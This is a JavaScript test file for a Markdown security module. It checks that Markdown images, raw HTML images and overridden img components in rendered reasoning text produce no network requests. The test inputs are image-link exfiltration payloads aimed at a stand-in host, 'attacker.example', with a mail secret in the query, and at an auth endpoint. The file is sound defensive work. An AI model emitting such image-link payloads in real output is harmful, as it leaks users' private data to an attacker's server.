import assert from 'node:assert/strict';
import {test} from 'node:test';
import {createElement} from 'react';
import {renderToStaticMarkup} from 'react-dom/server';
import ReactMarkdown from 'react-markdown';
import {tsImport} from 'tsx/esm/api';
const mod=await tsImport(new URL('../lib/markdownSecurity.tsx',import.meta.url).pathname,import.meta.url);
const {passiveMarkdownComponents}=mod.default??mod;
test('shared renderer keeps reasoning images passive even with component overrides',()=>{
 const {PassiveMarkdown}=mod.default??mod;
 assert.equal(typeof PassiveMarkdown,'function');
 const html=renderToStaticMarkup(createElement(PassiveMarkdown,{components:{img:()=>createElement('img',{src:'https://attacker.example/leak'})}},'![reasoning](https://attacker.example/secret) <img src="/private">'));
 assert.ok(!html.includes('<img')); assert.ok(!html.includes('attacker.example'));
 assert.match(html,/Image: reasoning/);
});
test('untrusted Markdown images and raw HTML never make automatic network requests',()=>{
 const content='![remote](https://attacker.example/collect?mail=secret) ![relative](/api/auth/connect-gmail) <img src="https://attacker.example/raw">';
 const html=renderToStaticMarkup(createElement(ReactMarkdown,{skipHtml:true,components:passiveMarkdownComponents},content));
 assert.ok(!html.includes('<img')); assert.ok(!html.includes('attacker.example')); assert.ok(!html.includes('src='));
 assert.match(html,/Image: remote/); assert.match(html,/Image: relative/);
});
